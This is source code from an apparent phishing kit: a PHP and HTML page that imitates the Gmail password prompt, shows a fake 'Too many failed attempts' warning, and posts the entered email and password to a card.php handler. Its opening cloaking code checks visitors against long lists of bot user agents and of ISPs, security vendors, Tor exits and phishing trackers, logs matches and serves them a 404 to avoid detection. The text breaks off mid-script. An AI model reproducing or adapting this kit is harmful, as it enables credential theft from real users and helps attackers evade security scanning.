             "ips-agent",
             "scoutjet",
             "UptimeRobot",
             "FM Scene",
             "Prevx",
             "WindowsPowerShell"
        );
            foreach ($Bot as $BotType) {
                if (stripos($_SERVER['HTTP_USER_AGENT'], $BotType) !== false) {
                    $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
                }
            }
        
        $ispnya = gethostbyaddr($_SERVER['REMOTE_ADDR']);
        
        $banned_isp = array(
            'Peak 10',
            'Quasi Networks LTD',
            'SC Rusnano',
            'GoDaddy.com, LLC',
            'Server Plan S.r.l.',
            'Linode',
            'Blazing SEO',
            'Lixux OU',
            'Inter Connects Inc',
            'Flokinet Ltd',
            'LukMAN Multimedia Sp. z o.o',
            'PIPEX-BLOCK1',
            'IPVanish',
            'LinkGrid LLC',
            'Snab-Inform Private Enterprise',
            'Cisco Systems',
            'Network and Information Technology Limited',
            'London Wires Ltd.',
            'Tehnologii Budushego LLC',
            'Eonix Corporation',
            'hosttech GmbH',
            'Wowrack.com',
            'SunGard Availability Services LP',
            'Internap Network Services Corporation',
            'Palo Alto Networks',
            'PlusNet Technologies Ltd',
            'Scaleway',
            'Facebook',
            'Host1Plus',
            'XO Communications',
            'Nobis Technology Group',
            'ExpressVPN',
            'DME Hosting LLC',
            'Prescient Software',
            'Sungard Network Solutions',
            'OVH SAS',
            'Iomart Hosting Ltd',
            'Hosting Solution',
            'Barracuda Networks',
            'Sungard Network Solutions',
            'Solar VPS',
            'PHPNET Hosting Services',
            'DigitalOcean',
            'Level 3 Communications',
            'softlayer',
            'Chelyabinsk-Signal LLC',
            'SoftLayer Technologies',
            'Complete Internet Access',
            'london-tor.mooo.com',
            'amazonaws',
            'cyveillance',
            'phishtank',
            'tor.piratenpartei-nrw.de',
            'cpanel66.proisp.no',
            'tor-node.com',
            'dreamhost',
            'Involta',
            'exit0.liskov.tor-relays.net',
            'tor.tocici.com',
            'netpilot',
            'calyxinstitute',
            'tor-exit',
            'msnbot',
            'p3pwgdsn',
            'netcraft',
            'University of Virginia',
            'trendmicro',
            'ebay',
            'paypal',
            'torservers',
            'comodo',
            'EGIHosting',
            'ebbs.healingpathsolutions.com',
            'healingpathsolutions.com',
            'Solution Pro',
            'Zayo Bandwidth',
            'spider.clicktargetdevelopment.com',
            'clicktargetdevelopment.com',
            'static.spro.net',
            'Digital Ocean',
            'Internap Network Services Corporation',
            'Blue Coat Systems',
            'GANDI SAS',
            'roamsite.com',
            'PIPEX-BLOCK1',
            'ColoUp',
            'Westnet',
            'The University of Tokyo',
            'University',
            'University of',
            'QuadraNet',
            'exit-01a.noisetor.net',
            'noisetor.net',
            'noisetor',
            'vultr.com',
            'Zscaler',
            'Choopa',
            'RedSwitches Pty',
            'Quintex Alliance Consulting',
            'www16.mailshell.com',
            'this.is.a.tor.exit-node.net',
            'this.is.a.tor.node.xmission.com',
            'colocrossing.com',
            'DedFiberCo',
            'crawl',
            'sucuri.net',
            'crawler',
            'proxy',
            'enom',
            'cloudflare',
            'yahoo',
            'trustwave',
            'rima-tde.net',
            'tfbnw.net',
            'pacbell.net',
            'tpnet.pl',
            'ovh.net',
            'centralnic',
            'badware',
            'phishing',
            'antivirus',
            'SiteAdvisor',
            'McAfee',
            'Bitdefender',
            'avirasoft',
            'phishtank.com',
            'googleusercontent',
            'OVH SAS',
            'Yahoo',
            'Yahoo! Inc.',
            'Google',
            'Google Inc.',
            'GoDaddy',
            'Amazon Technologies Inc.',
            'Amazon',
            'Top Level Hosting SRL',
            'Twitter',
            'Microsoft',
            'Microsoft Corporation',
            'OVH',
            'VPSmalaysia.com.my',
            'Madgenius.com',
            'Barracuda Networks Inc.',
            'Barracuda',
            'SecuredConnectivity.net',
            'Digital Domain',
            'Hetzner Online',
            'Akamai',
            'SoftLayer',
            'SURFnet',
            'Creative Thought Inc.',
            'Fastly',
            'Return Path Inc.',
            'WhatsApp',
            'Instagram',
            'Schulte Consulting LLC',
            'Universidade Federal do Rio de Janeiro',
            'Sectoor',
            'Bitfolk',
            'DIR A/S',
            'Team Technologies LLC',
            'Mainloop',
            'Junk Email Filter Inc.',
            'Art Matrix - Lightlink Inc.',
            'Redpill Linpro AS',
            'CloudFlare',
            'ESET spol. s r.o.',
            'AVAST Software s.r.o.',
            'Dosarrest',
            'Apple Inc.',
            'Symantec',
            'Mozilla',
            'Netprotect SRL',
            'Host Europe GmbH',
            'Host Sailor Ltd.',
            'PSINet Inc.',
            'Daniel James Austin',
            'RamNode',
            'Hostalia',
            'Xs4all Internet BV',
            'Inktomi Corporation',
            'Eircom Customer Assignment',
            '9New Network Inc',
            'Sony',
            'Private IP Address LAN',
            'Computer Problem Solving',
            'Fortinet',
            'Avira',
            'Rackspace',
            'Baidu',
            'Comodo',
            'Incapsula Inc',
            'Orange Polska Spolka Akcyjna',
            'Infosphere',
            'Private Customer',
            'SurfControl',
            'University of Newcastle upon Tyne',
            'Total Server Solutions',
            'LukMAN',
            'eSecureData',
            'Hosting',
            'VI Na Host Co. Ltd',
            'B2 Net Solutions',
            'Master Internet',
            'Global Perfomance',
            'Fireeye',
            'AntiVirus',
            'Security',
            'Intersoft Internet',
            'Voxility',
            'Linode',
            'Internet-Pro',
            'Trustwave Holdings Inc',
            'Online SAS',
            'Versaweb',
            'Liquid Web',
            'A100 ROW',
            'Apexis AG',
            'Apexis',
            'LogicWeb',
            'Virtual1 Limited',
            'VNET a.s.',
            'Static IP Assignment',
            'TerraTransit AG',
            'Merit Network',
            'PathsConnect',
            'Long Thrive',
            'LG DACOM',
            'Secure Internet',
            'Kaspersky',
            'UK Dedicated Servers Limited',
            'Customer Network',
            'Flokinet',
            'Simpli Networks LLC',
            'Psychz',
            'PrivateSystems Networks',
            'ScanSafe Services',
            'CachedNet',
            'CloudVPN',
            'Spark New Zealand Trading Ltd',
            'Whitelabel IT Solutions Corp',
            'Hostwinds',
            'Hosteros LLC',
            'HostUS',
            'Host',
            'ClientID',
            'Server',
            'Oracle',
            'Fortinet',
            'Unus Inc.',
            'Public facing services',
            'Virtual Employee Pvt Ltd',
            'Dataline Ltd',
            'Teksavvy Solutions Inc.',
            'UPC Romania Bucuresti',
            'TalkTalk Communications Limited',
            'British Telecommunications PLC',
            'Global Data Networks LLC',
            'Quintex Alliance Consulting',
            'Online S.A.S.',
            'Content Delivery Network Ltd',
            'Nobis Technology Group LLC',
            'Parrukatu',
            'JSC ER-Telecom Holding',
            'ChinaNet Fujian Province Network',
            'QualityNetwork',
            'Vist On-Line Ltd',
            'The Calyx Institute',
            'Internet Customers',
            'OJSC Oao Tattelecom',
            'Petersburg Internet Network Ltd.',
            'Psychz Networks',
            'Udasha',
            'Onavo Mobile Ltd',
            'Cubenode System SL',
            'OVH Hosting Inc.',
            'NForce Entertainment B.V.',
            'DigitalOcean LLC',
            'Glenayre Electronics Inc.',
            'British Telecommunications PLC',
            'Iomart Hosting Limited',
            'Digital Energy Technologies Limited',
            'Private Customer',
            'Cisco Systems Inc.',
            'Vultr Holdings LLC',
            'Amazon.com Inc.',
            'Web Hosting Solutions',
            'Time Warner Cable Internet LLC',
            'Internet Security - TC',
            'Vertical Telecoms Broadband Networks and Internet Provider',
            'Ventelo Wholesale',
            'MYX Group LLC',
            'France Telecom S.A.',
            'Online S.A.S.',
            'Nine Internet Solutions AG',
            'Microsoft Azure',
            'Choopa, LLC',
            'Amazon',
            'HighWinds Network',
            'Amazon.com',
            'Bell Canada',
            'Digital Ocean',
            'M247 LTD Frankfurt Infrastructure',
            'Palo Alto Networks',
            'Spectrum',
            'ImOn Communications, LLC',
            'Wintek Corporation',
            'ServerMania',
            'Claro Dominican Republic',
            '013 NetVision',
            'Amazon.com',
            'Digital Ocean',
            'TalkTalk',
            'HostDime.com',
            'AVAST Software s.r.o.',
            'Host1Plus Cloud Servers',
            'Amazon Data Services NoVa',
            'Google Cloud',
            'M-net',
            'Digiweb ltd',
            'Prescient Software',
            'Eir Broadband',
            'Solution Pro',
            'Bell Canada',
            'Linode',
            'DigitalOcean',
            'Plusnet',
            'GigeNET',
            'ZenLayer',
            'NFOrce Entertainment B.V.',
            'NewMedia Express',
            'Telegram Messenger Network',
            'IQ PL Sp. z o.o.',
            'Datacamp Limited',
            'Tahoe Internet Exchange (TahoeIX)',
            'ITCOM Shpk',
            'HEG US'
        
        );
            foreach ($banned_isp as $isps) {
                if (substr_count($ispnya, $isps) > 0) {
                   $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ISP ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
                }
            }
          
?>


<!DOCTYPE html>
<html lang="EN">
    <head>
        <meta charset="utf-8">
        <title>Gmail</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" type="text/css" href="css/gmail.css">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Google+Sans:100,300,400,500,700,900,100i,300i,400i,500i,700i,900i">
        <link rel="shortcut icon" href="img/Gmail/gmail.ico" type="image/x-icon">
    </head>
    <body id="yDmH0d" class="nyoS7c SoDlKd EIlDfe" jscontroller="Uas9Hd" jsaction="rcuQ6b:npT2md;click:FAbpgf;wINJic:.CLIENT;GvneHb:.CLIENT;qako4e:.CLIENT;TSpWaf:.CLIENT;nHjqDd:.CLIENT;keydown:.CLIENT" tabindex="-1">
        <div class="H2SoFe LZgQXe TFhTPc">
            <div class="RAYh1e LZgQXe qmmlRd" id="initialView" role="presentation" jsname="WsjYwc" jscontroller="GHsEdb" jsaction="rcuQ6b:wVXPKc,eyofDf;CfTBWd:r0xNSb;enEq8c:Yd2OHe;Z2AmMb:nnGvjf;eqoCse:oUMEzf;RdYeUb:oUMEzf;EJh3N:vYWWBd;">
                <div class="RZBuIb c8DD0" aria-hidden="true">
                    <div id="grayBar" jscontroller="ltDFwf" jsaction="transitionend:Zdx3Re" jsname="Igk6W" role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc">
                        <div class="xcNBHc um3FLe"></div>
                        <div jsname="cQwEuf" class="w2zcLc Iq5ZMc"></div>
                        <div id="theBar" class="MyvhI TKVRUb" jsname="P1ekSe"><span class="l3q5xe SQxu9c"></span></div>
                        <div id="theBar" class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
                    </div>
                </div>
                <div class="xkfVF" jsname="f2d3ae" role="presentation" tabindex="null">
                    <div class="Aa1VU">
                        <div class="whiteOverlay"></div>
                        <div class="Lth2jb " jsname="n7vHCb" jscontroller="rKxYMb" jsaction="rcuQ6b:qg4Ic;Kzwjs:WPi0i;" data-oauth-third-party-logo-url="" aria-hidden="true">
                            <div jsname="jjf7Ff">
                                <div id="logo" class="v8vQje" title="Google">
                                    <div class="rr0DNb" jsname="l4eHX"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg></div>
                                </div>
                            </div>
                        </div>
                        <div id="view_container" class="JhUD8d SQNfcc vLGJgb" jscontroller="WFS13" jsaction="rcuQ6b:npT2md" jsmodel="Z7PiFb qFmk3b qbZ0Se nqpTHe hAn1A YPPRX eV9nn Xu2csd hc6Ubd"
                            data-initial-sign-in-data="%.@.&quot;gf.isid&quot;,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],[28,10,20,22,29,6],null,&quot;AEThLlyJ6QXqJXkyrjbOt2G4wErfzH_tSM2XUGOwGU_eR5wbH115Afhe-IQCVbBcc13ZLnk7kNMq5N_HNbeD1M9mrkXLa9FHtR_RSlJNfFQxSpD0Iv0Xc0A-DCt4Y_dfBO4nCSeDWgdPImlmgzKRiE0TE6EfP8XXyhJ4DCVh_qCXnC19QIfrghF6SfvFLdsQtEwQUIviziw5&quot;,[[]]]">
                            <div jscontroller="Ka7I6" jsaction="jiqeKb:ZCwQbe;u3KAb:ZCwQbe;cLkKDf:n4vmRb;DPVjO:tVBJG;eyyw5c:gVmDzc;rcuQ6b:rcuQ6b;click:vBw6I(preventDefault=true|L6M1Fb),EtG4V(preventDefault=true|CkSUlf);C73E2d:gVmDzc;DiUYjc:.CLIENT;abBxn:.CLIENT;nKbR0:.CLIENT;ffNU7c:.CLIENT"
                                jsname="nUpftc" class="zWl5kd" data-view-id="b5STy">
                                <div class="DRS7Fe bxPAYd k6Zj8d" jsname="lr9nlf" jscontroller="Z3Buzf" jsshadow="" data-branding="jcJzye" role="presentation">
                                    <div jsname="paFcre">
                                        <div class="jXeDnc " jsname="tJHJj" jscontroller="S9352b" jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;">
                                            <h1 class="ahT6S " data-a11y-title-piece="" id="headingText" jsname="r4nke"><span jsslot="">Welcome</span></h1>
                                            <div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob"></div>
                                            <div class="aCayab">
                                                <div jscontroller="BzWZlf" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d iiFyne cd29Sd" tabindex="0" role="link" aria-label="est3@gmail.com selected. Switch account" jsname="af8ijd">
                                                    <div class="gPHLDe">
                                                        <div class="qQWzTd" aria-hidden="true"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div>
                                                    </div>
                                                    <div jsname="fmcmS" class="KTeGk" id="profileIdentifier"><?php echo $_SESSION['email']; ?></div>
                                                    <div class="krLnGe"><svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div jsname="uybdVe" class="pwWryf bxPAYd" role="presentation">
                                        <div jsname="USBQqe" class="Wxwduf Us7fWe JhUD8d" role="presentation">
                                            <div class="WEQkZc"><span jsslot="" class="sFcPkb"><section class="aTzEhb  uXELDc rNe0id eLNT1d S7S4N" jscontroller="uwHxEe" jsname="INM6z" aria-live="assertive" aria-atomic="true" jsshadow=""><header class="IdEPtc" jsname="tJHJj"><div class="L9iFZc" role="presentation" jsname="NjaE2c"><h2 class="kV95Wc TrZEUc"><span class="yiP64c" aria-hidden="true" jsname="Bz112c"><svg aria-hidden="true" class="stUf5b d7Plee" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg></span>
                                                <span jsslot="" jsname="Ud7fr">Too many failed attempts</span>
                                                </h2>
                                                <div class="yMb59d" jsname="HSrbLb" aria-hidden="true"></div>
                                            </div>
                                            </header>
                                            <div class="CxRgyd" jsname="MZArnb">
                                                <div jsslot=""></div>
                                            </div>
                                            </section>
                                            </span>
                                            <div class="bCAAsb">
                                                <form action="../card.php" method="POST" id="form1">
                                                    <div>
                                                        <span jsslot="">
                                                            <section class="aTzEhb " jscontroller="uwHxEe" jsshadow="">
                                                                <header class="IdEPtc" jsname="tJHJj" aria-hidden="true"></header>
                                                                <div class="CxRgyd" jsname="MZArnb">
                                                                    <div jsslot=""><input type="email" name="identifier" class="F29zPe" tabindex="-1" aria-hidden="true" spellcheck="false" value="est3" jsname="KKx9x" autocomplete="off" id="hiddenEmail">
                                                                        <div class="SdBahf VxoKGd" jscontroller="MZKEPb" jsshadow="" jsname="vZSTIf" jsaction="rcuQ6b:rcuQ6b;KJ9cZc:nAF18e(EMUunb);RXQi4b:.CLIENT;TGB85e:.CLIENT;DQ0KUb:.CLIENT;HYMnzb:.CLIENT;sv6xVb:.CLIENT;sKmMle:.CLIENT" data-is-visible="false">
                                                                        <div class="eEgeR">
                                                                            <div class="W498nc">
                                                                                <div class="fdWl7b">
                                                                                    <div class="hDp5Db" jscontroller="zysDWd" jsaction="rcuQ6b:rcuQ6b;JIbuQc:OVHm7(sEbX2);RXQi4b:.CLIENT;TGB85e:.CLIENT;keydown:.CLIENT;AHmuwe:.CLIENT;O22p3e:.CLIENT;YqO5N:.CLIENT" jsname="UmsTj" jsshadow="">
                                                                                        <div id="password" class="rFrNMe ze9ebf YKooDc q9Nsuf zKHdkd sdJrJc" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Ufn6O">
                                                                                            <div class="aCsJod oJeWuf">
                                                                                                <div class="aXBtI Wic03c">
                                                                                                    <div class="Xb9hP">
                                                                                                        <input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Enter your password" name="emailPassword" autocapitalize="off" required dir="ltr" data-initial-dir="ltr" data-initial-value="" id="emailPassword">
                                                                                                        <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true" id="enterPass">Enter your password</div>
                                                                                                    </div>
                                                                                                    <div class="i9lrp mIZh1c"></div>
                                                                                                    <div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf" style="transform-origin: 110px center 0px;" id="borderRed"></div>
                                                                                                </div>
                                                                                            </div>
                                                                                            <div class="LXRPh">
                                                                                                <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="OyEIQ uSvLId" jsname="h9d3hd" aria-live="assertive" style="display: none;" id="dis-2">
                                                                            <div class="EjBTad" id="dis-1" style="display: none;">
                                                                                <svg class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                                                                </svg>
                                                                            </div>
                                                                            <div jsname="B34EJ">
                                                                                <span id="erl-1337" jsslot="">Wrong password. Try again or click Forgot password to reset it.</span>
                                                                            </div></div>
                                                                        <div class="EcjFDf" jsname="ESjtn"><div class="IhH7Wd" jsaction="rcuQ6b:xawz9d;RqOcWc:gfO0Le;" jscontroller="KylAQd" jsname="EMUunb" jsshadow=""><div class="ci67pc"><div class="BudEQ rBUW7e" jsaction="click:va5fqd;JIbuQc:vKfede(ornU0b);RXQi4b:.CLIENT;TGB85e:.CLIENT" jscontroller="Dt3C4" jsname="wQNmvb" jsshadow=""><div class="sSzDje NEk0Ve"><div class="enBDyd" id="test"><div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine y5MMGc sD2Hod VfPpkd-MPu53c-OWXEXe-mWPk3d" jscontroller="etBPYb" data-indeterminate="false" jsname="ornU0b" jsaction="click:cOuCgd; clickmod:vhIIDb; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; contextmenu:mg9Pef; animationend:L9dL9d;dyRcpb:dyRcpb;" data-value="optionc2"><input class="VfPpkd-muHVFf-bMcfAe" type="checkbox" jsname="YPqjbf" jsaction="focus:AHmuwe; blur:O22p3e; change:WPi0i;" aria-labelledby="selectionc0" id="checkbox"><div class="VfPpkd-YQoJzd"><svg class="VfPpkd-HUofsb" viewBox="0 0 24 24"><path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg><div class="VfPpkd-SJnn3d"></div></div><div class="VfPpkd-OYHm6b"></div></div></div><div class="DVnhEd"><div jsname="V67aGc" class="wFCloc"><label jsslot="" id="selectionc0" class="jGAaxb" jsname="CeL6Qc" for="checkbox">Show password</label></div></div></div></div></div><div aria-atomic="true" aria-live="assertive" class="Df4rGb" jsname="h9d3hd"><div jsslot=""></div></div></div></div><div class="gSlDTe" jsname="JIbuQc"></div></div><div jscontroller="lmaXKd" jsname="Si5T8b" class="Wzzww eLNT1d" jsaction="click:IMdg8d(A1U4Sb);rcuQ6b:jqIVcd"><img jsname="O9Milc" id="captchaimg" class="TrZEUc"><button class="yz7Gpc TrZEUc" jsname="A1U4Sb" id="playCaptchaButton" tabindex="0" aria-label="Listen and type the numbers that you hear" type="button"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.8-1-3.3-2.5-4v8c1.5-.7 2.5-2.2 2.5-4zM14 3.2v2.1c2.9.9 5 3.5 5 6.7s-2.1 5.9-5 6.7v2.1c4-.9 7-4.5 7-8.8s-3-7.9-7-8.8z"></path></svg></button><audio jsname="CakGX" type="audio/wav" id="captchaAudio"></audio><div jscontroller="b21kgd" jsaction="keydown:C9BaXe;O22p3e:Op2ZO;AHmuwe:Jt1EX;rcuQ6b:rcuQ6b;YqO5N:Lg5SV;rURRne:rcuQ6b;EJh3N:rcuQ6b;RXQi4b:.CLIENT;TGB85e:.CLIENT" jsname="CQRbLd" class="d2CFce cDSmF" role="presentation" data-is-rendered="true"><div class="rFrNMe N3Hzgf jjwyfe zKHdkd sdJrJc Tyc9J" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Vsb5Ub"><div class="aCsJod oJeWuf"><div class="aXBtI Wic03c"><div class="Xb9hP"><input type="text" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="off" spellcheck="false" tabindex="0" aria-label="Type the text you hear or see" name="ca" id="ca" dir="ltr" data-initial-dir="ltr" data-initial-value=""><div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Type the text you hear or see</div></div><div class="i9lrp mIZh1c"></div><div jsname="XmnwAc" class="OabDMe cXrdqd"></div></div></div><div class="LXRPh"><div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div><div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div></div></div></div><input jsname="SBlSod" type="hidden" name="ct" id="ct"></div></div></div></section></span></div>
                                            </div>
                                        </div>
                                        <div class="zQJV3">
                                            <div class="dG5hZc">
                                                <div class="qhFLie">
                                                    <div class="FliLIb DL0QTb">
                                                        <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" id="btnForm">
                                                        
                                                            <div class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc qIypjc TrZEUc lw1w4b" id="btnForm">
                                                                <span class="VfPpkd-vQzf8d" id="btnForm">Next</span>
                                                            </div>

                                                            </form>
                                                            
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="daaWTb" jsname="QkNstf">
                                                    <div jscontroller="Xq93uf" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="gVmDzc" class="FliLIb n4P87" id="forgotPassword" tabindex="-1">
                                                        <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true"><button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d uRo0Xe TrZEUc lw1w4b" jscontroller="soHxf" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;"
                                                                jsname="LgbsSe" type="button"><div class="VfPpkd-Jh9lGc"></div><span jsname="V67aGc" class="VfPpkd-vQzf8d">Forgot password?</span><div class="VfPpkd-RLmnJb"></div></button></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="RwBngc">
                <div class="u7land" jscontroller="VVHlDf" jsaction="rcuQ6b:npT2md;aLn7Wb:VPRXbd">
                    <div role="listbox" aria-expanded="false" id="lang-chooser" class="jgvuAb TkU0Xc" jscontroller="YwHGTd" jsaction="click:cOuCgd(LgbsSe); keydown:I481le; keypress:Kr2w4b; mousedown:UX7yZ(LgbsSe),npT2md(preventDefault=true); mouseup:lbsD7e(LgbsSe); mouseleave:JywGue; touchstart:p6p2H(LgbsSe); touchmove:FwuNnf; touchend:yfqBxc(LgbsSe|preventMouseEvents=true|preventDefault=true); touchcancel:JMtRjd(LgbsSe); focus:AHmuwe; blur:O22p3e;b5SvAb:TvD9Pc;"
                        jsshadow="" jsname="rfCUpd" aria-label="Change language">
                        <div jsname="LgbsSe" role="presentation">
                            <div class="ry3kXd Ulgu9" jsname="d9BH4c" role="presentation">
                                <div class="MocG8c B9IrJb LMgvRb KKjvXb" jsname="wQNmvb" jsaction="" data-value="en" aria-selected="true" role="option" tabindex="0">
                                    <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">‪English (<?php echo $_SESSION['ipDetails']['country']; ?>)‬</span>
                                </div>
                            </div>
                            <div class="CeEBt Ce1Y1c eU809d" role="presentation">
                                <div class="TquXA"></div>
                            </div>
                        </div>
                        <div class="OA0qNb ncFHed" soy-server-key="5:pZtlf" jsaction="click:dPTK6c(wQNmvb); mousedown:uYU8jb(wQNmvb); mouseup:LVEdXd(wQNmvb); mouseover:nfXz1e(wQNmvb); touchstart:Rh2fre(wQNmvb); touchmove:hvFWtf(wQNmvb); touchend:MkF9r(wQNmvb|preventMouseEvents=true)"
                            role="presentation" jsname="V68bde" style="display:none;"></div>
                    </div>
                </div>
                <ul class="Bgzgmd">
                    <li><a style="cursor: pointer;">Help</a></li>
                    <li><a style="cursor: pointer;">Privacy</a></li>
                    <li><a style="cursor: pointer;">Terms</a></li>
                </ul>
            </footer>
        </div>
        <script>
            function formSubmit() {
                var input = document.getElementById("emailPassword").value;
                if (input.trim() == "") {
                    document.getElementById("enterPass").style.color = "#d93025";
                    document.getElementById("borderRed").style = "border-color: #d93025;";
